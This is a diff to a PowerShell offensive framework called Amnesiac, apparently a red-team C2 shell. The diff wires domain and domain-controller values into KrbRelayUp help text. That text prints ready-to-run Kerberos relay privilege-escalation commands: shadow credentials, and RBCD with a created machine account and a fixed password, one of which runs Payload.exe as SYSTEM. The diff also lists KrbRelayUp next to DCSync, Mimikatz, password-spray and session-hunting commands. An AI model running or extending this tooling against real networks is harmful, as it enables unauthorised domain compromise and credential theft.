@@ -672,6 +672,8 @@ function Amnesiac {
 	$global:Message = $null
 	$global:RestoreTimeout = $False
 	$global:ScanModer = $False
+	$global:Domain = $Domain
+	$global:DomainController = $DomainController
 
     # ---- Stealth overhaul globals ----
     $global:DiskMode       = $false
@@ -2156,19 +2158,21 @@ function Start-LocalShell {
                 continue
             }
             if ([string]::IsNullOrWhiteSpace($krb_args)) {
+                $_krbDom = if ($global:Domain) { $global:Domain } else { '<domain>' }
+                $_krbDC  = if ($global:DomainController) { $global:DomainController } else { '<DC_IP>' }
                 Write-Output ""
                 Write-Output " [*] KrbRelayUp - Kerberos relay LPE (low-priv domain user -> SYSTEM)"
                 Write-Output ""
                 Write-Output "   [1] Shadow Credentials (requires ADCS):"
-                Write-Output "   KrbRelayUp full -m shadowcred --Domain <domain> --DomainController <DC_IP> --ForceShadowCred"
+                Write-Output "   KrbRelayUp full -m shadowcred --Domain $_krbDom --DomainController $_krbDC --ForceShadowCred"
                 Write-Output "       -> new terminal session as SYSTEM"
                 Write-Output ""
                 Write-Output "   [2] RBCD - new machine account:"
-                Write-Output "   KrbRelayUp full -m rbcd --Domain <domain> --DomainController <DC_IP> --CreateNewComputerAccount -cn TestMachine -cp 'Abrakadabra1!'"
+                Write-Output "   KrbRelayUp full -m rbcd --Domain $_krbDom --DomainController $_krbDC --CreateNewComputerAccount -cn TestMachine -cp 'Abrakadabra1!'"
                 Write-Output "       -> new terminal session as SYSTEM"
                 Write-Output ""
                 Write-Output "   [3] RBCD - spawn payload:"
-                Write-Output "   KrbRelayUp full -m rbcd --Domain <domain> --DomainController <DC_IP> --CreateNewComputerAccount -cn TestMachine -cp 'Abrakadabra1!' -sc ""cmd.exe /c c:\users\<user>\Desktop\Payload.exe"""
+                Write-Output "   KrbRelayUp full -m rbcd --Domain $_krbDom --DomainController $_krbDC --CreateNewComputerAccount -cn TestMachine -cp 'Abrakadabra1!' -sc ""cmd.exe /c c:\users\<user>\Desktop\Payload.exe"""
                 Write-Output "       -> executes Payload.exe as SYSTEM"
                 Write-Output ""
                 Write-Output " [*] Fetching binary into cache..."
@@ -3328,7 +3332,7 @@ function InteractWithPipeSession{
 			"Startup", "TLS", "Process"
 		)
 
-  		if($command -like "Kerb" -OR $command -like "Invoke-PassSpray*" -OR $command -like "DCSync" -OR $command -like "Access_Check*" -OR $command -like "Find-LocalAdminAccess*" -OR $command -like "Invoke-SessionHunter*" -OR $command -like "AutoMimi*" -OR $command -like "Mimi*"){
+  		if($command -like "Kerb" -OR $command -like "Invoke-PassSpray*" -OR $command -like "DCSync" -OR $command -like "Access_Check*" -OR $command -like "Find-LocalAdminAccess*" -OR $command -like "Invoke-SessionHunter*" -OR $command -like "AutoMimi*" -OR $command -like "Mimi*" -OR $command -like "KrbRelayUp*"){
 			$global:RestoreTimeout = $True
 			$timeoutSeconds = 300
 		}
@@ -4017,19 +4021,21 @@ function InteractWithPipeSession{
 			if (-not $global:KrbRelayUpBin -or $global:KrbRelayUpBin -eq 'CONFIGURE_ME.exe') {
 				Write-Output " [-] KrbRelayUp binary name not configured. Set `$global:KrbRelayUpBin in Amnesiac_ShellReady.ps1."
 			} elseif ([string]::IsNullOrWhiteSpace($krb_args)) {
+				$_krbDom = if ($global:Domain) { $global:Domain } else { '<domain>' }
+				$_krbDC  = if ($global:DomainController) { $global:DomainController } else { '<DC_IP>' }
 				Write-Output ""
 				Write-Output " [*] KrbRelayUp - Kerberos relay LPE (low-priv domain user -> SYSTEM)"
 				Write-Output ""
 				Write-Output "   [1] Shadow Credentials (requires ADCS):"
-				Write-Output "   KrbRelayUp full -m shadowcred --Domain <domain> --DomainController <DC_IP> --ForceShadowCred"
+				Write-Output "   KrbRelayUp full -m shadowcred --Domain $_krbDom --DomainController $_krbDC --ForceShadowCred"
 				Write-Output "       -> new terminal session as SYSTEM"
 				Write-Output ""
 				Write-Output "   [2] RBCD - new machine account:"
-				Write-Output "   KrbRelayUp full -m rbcd --Domain <domain> --DomainController <DC_IP> --CreateNewComputerAccount -cn TestMachine -cp 'Abrakadabra1!'"
+				Write-Output "   KrbRelayUp full -m rbcd --Domain $_krbDom --DomainController $_krbDC --CreateNewComputerAccount -cn TestMachine -cp 'Abrakadabra1!'"
 				Write-Output "       -> new terminal session as SYSTEM"
 				Write-Output ""
 				Write-Output "   [3] RBCD - spawn payload:"
-				Write-Output "   KrbRelayUp full -m rbcd --Domain <domain> --DomainController <DC_IP> --CreateNewComputerAccount -cn TestMachine -cp 'Abrakadabra1!' -sc ""cmd.exe /c c:\users\<user>\Desktop\Payload.exe"""
+				Write-Output "   KrbRelayUp full -m rbcd --Domain $_krbDom --DomainController $_krbDC --CreateNewComputerAccount -cn TestMachine -cp 'Abrakadabra1!' -sc ""cmd.exe /c c:\users\<user>\Desktop\Payload.exe"""
 				Write-Output "       -> executes Payload.exe as SYSTEM"
 				Write-Output ""
 			} else {
